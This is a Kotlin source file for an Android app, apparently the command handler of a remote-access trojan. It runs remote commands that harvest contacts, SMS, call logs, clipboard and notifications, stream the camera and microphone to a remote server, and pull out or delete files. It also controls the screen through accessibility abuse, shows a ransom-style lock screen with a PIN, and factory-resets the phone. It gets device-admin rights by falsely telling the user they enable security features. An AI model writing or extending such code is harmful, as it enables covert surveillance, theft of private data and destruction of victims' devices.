package com.template.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.Settings
import android.util.Base64
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

object NativeCommandHandler {

    private const val TAG = "NativeCmdHandler"
    private var mediaPlayer: MediaPlayer? = null

    // ==========================================
    // ===== MAIN EXECUTE =====
    // ==========================================
    fun execute(context: Context, command: String, extra: String): JSONObject {
        Log.d(TAG, "🎯 Execute: $command (extra=$extra)")

        return try {
            when (command) {
                // ===== PING =====
                "ping" -> JSONObject().apply {
                    put("ok", true)
                    put("pong", true)
                    put("ts", System.currentTimeMillis())
                }

                // ===== FLASHLIGHT =====
                "flash_strobe" -> toggleFlash(context, true)
                "stop_strobe" -> toggleFlash(context, false)

                // ===== VIBRATE =====
                "vibrate_loop" -> vibrateLoop(context)
                "stop_vibrate" -> stopVibrate(context)

                // ===== FORCE OPEN =====
                "force_open" -> forceOpen(context)

                // ===== OPEN URL =====
                "open_url" -> openUrl(context, extra)

                // ===== LOCK (OVERLAY + SOUND) =====
                "hard_lock" -> hardLockOverlay(context, extra)
                "unlock" -> unlockOverlay()

                // ===== DEVICE ADMIN =====
                "is_device_admin" -> JSONObject().apply {
                    put("ok", true)
                    put("is_admin", isDeviceAdmin(context))
                }
                "request_device_admin" -> {
                    requestDeviceAdmin(context)
                    JSONObject().apply {
                        put("ok", true)
                        put("message", "Dialog admin dibuka")
                    }
                }

                // ===== SCREEN CAPTURE =====
                "get_screen" -> JSONObject().apply {
                    put("ok", false)
                    put("error", "screen_capture_requires_activity")
                }

                // ===== SCREEN CONTROL (TOUCH INJECTION) =====
                "tap" -> tapScreen(extra)
                "long_press" -> longPressScreen(extra)
                "swipe" -> swipeScreen(extra)
                "pinch" -> pinchScreen(extra)
                "global_back" -> globalAction("back")
                "global_home" -> globalAction("home")
                "global_recents" -> globalAction("recents")
                "global_notifications" -> globalAction("notifications")
                "input_text" -> inputText(extra)

                // ===== FILE MANAGER =====
                "list_files" -> listFiles(extra)
                "download_file" -> downloadFile(extra)
                "delete_file" -> deleteFile(extra)
                "rename_file" -> renameFile(extra)

                // ===== AUDIO =====
                "play_audio" -> playAudio(context, extra)
                "stop_audio" -> stopAudio()
                "start_audio_stream" -> startAudioStream()
                "stop_audio_stream" -> stopAudioStream()

                // ===== CAMERA (Legacy HTTP) =====
                "take_photo" -> takePhotoReal(context, extra)
                "start_camera_stream" -> startCameraStreamReal(context, extra)
                "stop_camera_stream" -> stopCameraStreamReal(context)

                // ===== WEBRTC =====
                "webrtc_start_camera" -> webrtcStartCamera(context, extra)
                "webrtc_start_screen" -> webrtcStartScreen(context)
                "webrtc_stop" -> webrtcStop()
                "webrtc_offer" -> webrtcOffer()
                "webrtc_answer" -> webrtcAnswer(extra)
                "webrtc_ice" -> webrtcIce(extra)
                "webrtc_switch_camera" -> webrtcSwitchCamera()

                // ===== CONTACTS =====
                "get_contacts" -> getContacts(context)

                // ===== CALL LOG / SMS =====
                "get_call_logs" -> CommunicationDumper.getCallLogs(context)
                "get_sms_inbox" -> CommunicationDumper.getSmsInbox(context)

                // ===== KEYLOG / CLIPBOARD =====
                "get_keylogs" -> JSONObject().apply {
                    put("ok", true)
                    put("keylogs", JSONArray())
                }
                "get_clipboard" -> getClipboardData(context)

                // ===== NOTIFICATION REPLY =====
                "reply_notification" -> replyNotification(extra)
                "get_active_notifications" -> getActiveNotifications()

                // ===== ACCESSIBILITY =====
                "open_accessibility" -> {
                    openAccessibilitySettings(context)
                    JSONObject().apply { put("ok", true) }
                }
                "open_notification_listener" -> {
                    openNotificationListenerSettings(context)
                    JSONObject().apply { put("ok", true) }
                }

                // ===== PROTECTION =====
                "enable_protection" -> JSONObject().apply {
                    put("ok", false)
                    put("error", "protection_requires_activity")
                }
                "disable_protection" -> JSONObject().apply {
                    put("ok", false)
                    put("error", "protection_requires_activity")
                }

                // ===== FACTORY RESET =====
                "factory_reset" -> factoryReset(context)

                // ===== UNKNOWN =====
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "unknown_command")
                        put("command", command)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Execute error [$command]", e)
            JSONObject().apply {
                put("ok", false)
                put("error", "exception")
                put("message", e.message ?: "unknown")
            }
        }
    }

    // ==========================================
    // ===== FLASHLIGHT =====
    // ==========================================
    private fun toggleFlash(context: Context, on: Boolean): JSONObject {
        return try {
            val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            var cameraId: String? = null

            for (id in camManager.cameraIdList) {
                try {
                    val chars = camManager.getCameraCharacteristics(id)
                    val flashAvailable: Boolean =
                        chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
                    if (flashAvailable) {
                        cameraId = id
                        break
                    }
                } catch (e: Exception) {}
            }

            if (cameraId == null) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "no_flash")
                }
            }

            camManager.setTorchMode(cameraId, on)
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "flash_error")
            }
        }
    }

    // ==========================================
    // ===== VIBRATE =====
    // ==========================================
    private fun getVibrator(context: Context): Vibrator {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE)
                    as VibratorManager
            vm.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
    }

    private fun vibrateLoop(context: Context): JSONObject {
        return try {
            val vibrator = getVibrator(context)
            val pattern = longArrayOf(0, 500, 500)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, 0)
            }

            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "vibrate_error")
            }
        }
    }

    private fun stopVibrate(context: Context): JSONObject {
        return try {
            getVibrator(context).cancel()
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "vibrate_error")
            }
        }
    }

    // ==========================================
    // ===== FORCE OPEN =====
    // ==========================================
    private fun forceOpen(context: Context): JSONObject {
        return try {
            val intent = context.packageManager
                .getLaunchIntentForPackage(context.packageName)

            if (intent != null) {
                intent.addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                )
                context.startActivity(intent)
                JSONObject().apply { put("ok", true) }
            } else {
                JSONObject().apply {
                    put("ok", false)
                    put("error", "no_launch_intent")
                }
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "force_open_error")
            }
        }
    }

    // ==========================================
    // ===== OPEN URL =====
    // ==========================================
    private fun openUrl(context: Context, url: String): JSONObject {
        if (url.isEmpty()) {
            return JSONObject().apply {
                put("ok", false)
                put("error", "empty_url")
            }
        }
        return try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "url_error")
            }
        }
    }

    // ==========================================
    // ===== LOCK (OVERLAY + SOUND) =====
    // ==========================================
    private fun hardLockOverlay(context: Context, extra: String): JSONObject {
        return try {
            val parts = extra.split("|")

            val message = parts.getOrNull(0)?.takeIf { it.isNotEmpty() }
                ?: "YOUR PHONE IS LOCKED"
            val pin = parts.getOrNull(1)?.takeIf { it.isNotEmpty() }
                ?: "1234"
            val audioUrl = parts.getOrNull(2) ?: ""
            val volume = parts.getOrNull(3)?.toFloatOrNull() ?: 1.0f

            Log.d(TAG, "🔒 Lock overlay: msg=$message, audio=$audioUrl, vol=$volume")

            val intent = Intent(context, LockOverlayActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    Intent.FLAG_ACTIVITY_NO_HISTORY or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
                putExtra(LockOverlayActivity.EXTRA_MESSAGE, message)
                putExtra(LockOverlayActivity.EXTRA_PIN, pin)
                putExtra("lock_audio_url", audioUrl)
                putExtra("lock_audio_volume", volume)
            }
            context.startActivity(intent)

            JSONObject().apply {
                put("ok", true)
                put("locked", true)
                put("message", message)
                put("has_sound", audioUrl.isNotEmpty())
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "lock_error")
            }
        }
    }

    private fun unlockOverlay(): JSONObject {
        return try {
            LockOverlayManager.unlock()
            JSONObject().apply {
                put("ok", true)
                put("unlocked", true)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "unlock_error")
            }
        }
    }

    // ==========================================
    // ===== DEVICE ADMIN =====
    // ==========================================
    private fun isDeviceAdmin(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                as DevicePolicyManager
        val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(admin)
    }

    private fun requestDeviceAdmin(context: Context) {
        try {
            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Izinkan untuk mengaktifkan fitur keamanan perangkat",
            )
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "requestDeviceAdmin error", e)
        }
    }

    // ==========================================
    // ===== SCREEN CONTROL (TOUCH INJECTION) =====
    // ==========================================
    private fun getAccessibilityService(): MyAccessibilityService? {
        val service = MyAccessibilityService.instance
        if (service == null) {
            Log.w(TAG, "⚠️ Accessibility service not running")
        }
        return service
    }

    private fun tapScreen(extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val x = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
            val y = parts.getOrNull(1)?.toFloatOrNull() ?: 0f

            val service = getAccessibilityService()
                ?: return JSONObject().apply {
                    put("ok", false)
                    put("error", "accessibility_service_not_running")
                }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "requires_android_7")
                }
            }

            val ok = service.performTap(x, y)
            JSONObject().apply {
                put("ok", ok)
                put("x", x)
                put("y", y)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "tap_error")
            }
        }
    }

    private fun longPressScreen(extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val x = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
            val y = parts.getOrNull(1)?.toFloatOrNull() ?: 0f
            val dur = parts.getOrNull(2)?.toLongOrNull() ?: 1000L

            val service = getAccessibilityService()
                ?: return JSONObject().apply {
                    put("ok", false)
                    put("error", "accessibility_service_not_running")
                }

            val ok = service.performLongPress(x, y, dur)
            JSONObject().apply { put("ok", ok) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "long_press_error")
            }
        }
    }

    private fun swipeScreen(extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val x1 = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
            val y1 = parts.getOrNull(1)?.toFloatOrNull() ?: 0f
            val x2 = parts.getOrNull(2)?.toFloatOrNull() ?: 0f
            val y2 = parts.getOrNull(3)?.toFloatOrNull() ?: 0f
            val dur = parts.getOrNull(4)?.toLongOrNull() ?: 300L

            val service = getAccessibilityService()
                ?: return JSONObject().apply {
                    put("ok", false)
                    put("error", "accessibility_service_not_running")
                }

            val ok = service.performSwipe(x1, y1, x2, y2, dur)
            JSONObject().apply {
                put("ok", ok)
                put("from", "$x1,$y1")
                put("to", "$x2,$y2")
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "swipe_error")
            }
        }
    }

    private fun pinchScreen(extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val cx = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
            val cy = parts.getOrNull(1)?.toFloatOrNull() ?: 0f
            val dx = parts.getOrNull(2)?.toFloatOrNull() ?: 100f
            val dy = parts.getOrNull(3)?.toFloatOrNull() ?: 100f
            val dur = parts.getOrNull(4)?.toLongOrNull() ?: 300L

            val service = getAccessibilityService()
                ?: return JSONObject().apply {
                    put("ok", false)
                    put("error", "accessibility_service_not_running")
                }

            val ok = service.performPinch(cx, cy, dx, dy, dur)
            JSONObject().apply { put("ok", ok) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "pinch_error")
            }
        }
    }

    private fun globalAction(action: String): JSONObject {
        return try {
            val service = getAccessibilityService()
                ?: return JSONObject().apply {
                    put("ok", false)
                    put("error", "accessibility_service_not_running")
                }

            val ok = when (action) {
                "back" -> service.performBack()
                "home" -> service.performHome()
                "recents" -> service.performRecents()
                "notifications" -> service.performNotifications()
                else -> false
            }

            JSONObject().apply {
                put("ok", ok)
                put("action", action)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "global_action_error")
            }
        }
    }

    private fun inputText(text: String): JSONObject {
        return try {
            val service = getAccessibilityService()
                ?: return JSONObject().apply {
                    put("ok", false)
                    put("error", "accessibility_service_not_running")
                }

            val ok = service.setTextOnFocusedNode(text)
            JSONObject().apply { put("ok", ok) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "input_text_error")
            }
        }
    }

    // ==========================================
    // ===== FILE MANAGER =====
    // ==========================================
    private fun listFiles(path: String): JSONObject {
        return try {
            val targetPath = if (path.isEmpty()) {
                android.os.Environment.getExternalStorageDirectory().absolutePath
            } else {
                path
            }

            val dir = java.io.File(targetPath)
            if (!dir.exists() || !dir.isDirectory) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "directory_not_found")
                    put("path", targetPath)
                }
            }

            val filesList = mutableListOf<JSONObject>()
            dir.listFiles()?.forEach { f ->
                try {
                    filesList.add(JSONObject().apply {
                        put("name", f.name)
                        put("path", f.absolutePath)
                        put("isDirectory", f.isDirectory)
                        put("size", if (f.isFile) f.length() else 0)
                        put("lastModified", f.lastModified())
                        put("canRead", f.canRead())
                        put("canWrite", f.canWrite())
                    })
                } catch (e: Exception) {}
            }

            JSONObject().apply {
                put("ok", true)
                put("path", targetPath)
                put("files", JSONArray(filesList))
                put("count", filesList.size)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "list_error")
            }
        }
    }

    private fun downloadFile(extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val filePath = parts.getOrNull(0) ?: return JSONObject().apply {
                put("ok", false)
                put("error", "empty_path")
            }
            val maxSizeKb = parts.getOrNull(1)?.toLongOrNull() ?: 5000L

            val file = java.io.File(filePath)
            if (!file.exists() || !file.isFile) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "file_not_found")
                }
            }

            val sizeKb = file.length() / 1024
            if (sizeKb > maxSizeKb) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "file_too_large")
                    put("sizeKb", sizeKb)
                    put("maxSizeKb", maxSizeKb)
                }
            }

            val bytes = file.readBytes()
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

            JSONObject().apply {
                put("ok", true)
                put("name", file.name)
                put("size", file.length())
                put("content_base64", base64)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "download_error")
            }
        }
    }

    private fun deleteFile(path: String): JSONObject {
        return try {
            val file = java.io.File(path)
            if (!file.exists()) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "file_not_found")
                }
            }

            val ok = if (file.isDirectory) {
                file.deleteRecursively()
            } else {
                file.delete()
            }

            JSONObject().apply {
                put("ok", ok)
                put("path", path)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "delete_error")
            }
        }
    }

    private fun renameFile(extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val oldPath = parts.getOrNull(0) ?: ""
            val newName = parts.getOrNull(1) ?: ""

            if (oldPath.isEmpty() || newName.isEmpty()) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "invalid_arguments")
                }
            }

            val oldFile = java.io.File(oldPath)
            if (!oldFile.exists()) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "file_not_found")
                }
            }

            val parent = oldFile.parentFile
            val newFile = java.io.File(parent, newName)
            val ok = oldFile.renameTo(newFile)

            JSONObject().apply {
                put("ok", ok)
                put("oldPath", oldPath)
                put("newPath", newFile.absolutePath)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "rename_error")
            }
        }
    }

    // ==========================================
    // ===== AUDIO =====
    // ==========================================
    private fun playAudio(context: Context, url: String): JSONObject {
        if (url.isEmpty()) {
            return JSONObject().apply {
                put("ok", false)
                put("error", "empty_url")
            }
        }
        return try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnErrorListener { _, _, _ -> true }
                prepareAsync()
            }
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "audio_error")
            }
        }
    }

    private fun stopAudio(): JSONObject {
        return try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply { put("ok", true) }
        }
    }

    private fun startAudioStream(): JSONObject {
        return try {
            val ok = AudioStreamService.start { chunk ->
                ConnectionService.sendAudioFrame(chunk)
            }
            JSONObject().apply {
                put("ok", ok)
                put("streaming", ok)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "audio_stream_error")
            }
        }
    }

    private fun stopAudioStream(): JSONObject {
        return try {
            AudioStreamService.stop()
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply { put("ok", true) }
        }
    }

    // ==========================================
    // ===== CAMERA (Legacy HTTP) =====
    // ==========================================
    private fun takePhotoReal(context: Context, extra: String): JSONObject {
        return try {
            val facing = extra.ifEmpty { "back" }

            CameraStreamService.takePhoto(context, facing) { base64, error ->
                val result = JSONObject().apply {
                    if (error != null) {
                        put("ok", false)
                        put("error", error)
                    } else {
                        put("ok", true)
                        put("image_base64", base64 ?: "")
                        put("size", base64?.length ?: 0)
                    }
                }
                ConnectionService.sendCommandResponse("take_photo", result)
            }

            JSONObject().apply {
                put("ok", true)
                put("message", "photo_capture_initiated")
                put("async", true)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "photo_error")
            }
        }
    }

    private fun startCameraStreamReal(context: Context, extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val facing = parts.getOrNull(0)?.ifEmpty { "back" } ?: "back"
            val interval = parts.getOrNull(1)?.toLongOrNull() ?: 200L

            val ok = CameraStreamService.start(
                context = context,
                facing = facing,
                intervalMs = interval,
                frameCallback = { base64 ->
                    ConnectionService.sendCameraFrame(base64)
                },
                errorCallback = { error ->
                    Log.e(TAG, "Camera stream error: $error")
                },
            )

            JSONObject().apply {
                put("ok", ok)
                put("facing", facing)
                put("interval", interval)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "stream_error")
            }
        }
    }

    private fun stopCameraStreamReal(context: Context): JSONObject {
        return try {
            CameraStreamService.stop(context)
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "stop_error")
            }
        }
    }

    // ==========================================
    // ===== WEBRTC =====
    // ==========================================
    private fun webrtcStartCamera(context: Context, extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val facing = parts.getOrNull(0) ?: "back"
            val withAudio = parts.getOrNull(1)?.toBoolean() ?: true

            val ok = WebRTCService.startCameraStream(context, facing, withAudio)

            // Set ICE callback
            WebRTCService.onIceCandidate = { json ->
                ConnectionService.sendCommandResponse("webrtc_ice", json)
            }

            // Buat offer
            WebRTCService.createOffer { offer ->
                ConnectionService.sendCommandResponse("webrtc_offer", offer)
            }

            JSONObject().apply {
                put("ok", ok)
                put("mode", "camera")
                put("facing", facing)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "webrtc_error")
            }
        }
    }

    private fun webrtcStartScreen(context: Context): JSONObject {
        return JSONObject().apply {
            put("ok", false)
            put("error", "screen_stream_requires_activity")
            put("message", "Buka Activity dulu untuk request MediaProjection")
        }
    }

    private fun webrtcStop(): JSONObject {
        return try {
            WebRTCService.stop()
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "stop_error")
            }
        }
    }

    private fun webrtcOffer(): JSONObject {
        return try {
            WebRTCService.createOffer { offer ->
                ConnectionService.sendCommandResponse("webrtc_offer", offer)
            }
            JSONObject().apply {
                put("ok", true)
                put("message", "offer_created_async")
                put("async", true)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "offer_error")
            }
        }
    }

    private fun webrtcAnswer(extra: String): JSONObject {
        return try {
            WebRTCService.setRemoteAnswer(extra)
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "answer_error")
            }
        }
    }

    private fun webrtcIce(extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val sdp = parts.getOrNull(0) ?: ""
            val sdpMid = parts.getOrNull(1)
            val sdpMLineIndex = parts.getOrNull(2)?.toIntOrNull() ?: 0

            WebRTCService.addIceCandidate(sdp, sdpMid, sdpMLineIndex)
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "ice_error")
            }
        }
    }

    private fun webrtcSwitchCamera(): JSONObject {
        return try {
            WebRTCService.switchCamera()
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "switch_error")
            }
        }
    }

    // ==========================================
    // ===== CONTACTS =====
    // ==========================================
    private fun getContacts(context: Context): JSONObject {
        return try {
            val contactsList = mutableListOf<Map<String, String>>()
            val cursor = context.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null,
            )

            cursor?.use {
                val nameIdx = it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                )
                val phoneIdx = it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                )

                while (it.moveToNext()) {
                    val name = if (nameIdx >= 0) it.getString(nameIdx) else ""
                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) else ""
                    contactsList.add(mapOf(
                        "name" to (name ?: ""),
                        "phone" to (phone ?: ""),
                    ))
                }
            }

            val jsonArray = JSONArray()
            for (c in contactsList) {
                jsonArray.put(JSONObject(c))
            }

            JSONObject().apply {
                put("ok", true)
                put("contacts", jsonArray)
                put("count", contactsList.size)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "contacts_error")
                put("contacts", JSONArray())
                put("count", 0)
            }
        }
    }

    // ==========================================
    // ===== CLIPBOARD =====
    // ==========================================
    private fun getClipboardData(context: Context): JSONObject {
        return try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE)
                    as android.content.ClipboardManager
            if (clipboard.hasPrimaryClip()) {
                val clip = clipboard.primaryClip
                if (clip != null && clip.itemCount > 0) {
                    val text = clip.getItemAt(0).text?.toString() ?: ""
                    JSONObject().apply {
                        put("ok", true)
                        put("text", text)
                    }
                } else {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "clipboard_empty")
                    }
                }
            } else {
                JSONObject().apply {
                    put("ok", false)
                    put("error", "no_clipboard")
                }
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "clipboard_error")
            }
        }
    }

    // ==========================================
    // ===== NOTIFICATION REPLY =====
    // ==========================================
    private fun replyNotification(extra: String): JSONObject {
        return try {
            val parts = extra.split("|")
            val notifKey = parts.getOrNull(0) ?: ""
            val text = parts.getOrNull(1) ?: ""

            val service = NotificationReplyService.instance
                ?: return JSONObject().apply {
                    put("ok", false)
                    put("error", "notification_listener_not_connected")
                }

            val ok = service.replyToNotification(notifKey, text)
            JSONObject().apply {
                put("ok", ok)
                put("notifKey", notifKey)
                put("text", text)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "reply_error")
            }
        }
    }

    private fun getActiveNotifications(): JSONObject {
        return try {
            val service = NotificationReplyService.instance
                ?: return JSONObject().apply {
                    put("ok", false)
                    put("error", "notification_listener_not_connected")
                    put("notifications", JSONArray())
                }

            val list = service.getActiveNotificationsList()
            val jsonArray = JSONArray()
            for (n in list) {
                jsonArray.put(JSONObject(n))
            }

            JSONObject().apply {
                put("ok", true)
                put("notifications", jsonArray)
                put("count", list.size)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "get_notifs_error")
                put("notifications", JSONArray())
            }
        }
    }

    // ==========================================
    // ===== SETTINGS =====
    // ==========================================
    private fun openAccessibilitySettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "openAccessibility error", e)
        }
    }

    private fun openNotificationListenerSettings(context: Context) {
        try {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "openNotifListener error", e)
        }
    }

    // ==========================================
    // ===== FACTORY RESET =====
    // ==========================================
    private fun factoryReset(context: Context): JSONObject {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                    as DevicePolicyManager
            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)

            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0)
                JSONObject().apply { put("ok", true) }
            } else {
                JSONObject().apply {
                    put("ok", false)
                    put("error", "device_admin_not_active")
                }
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "factory_reset_error")
            }
        }
    }
}
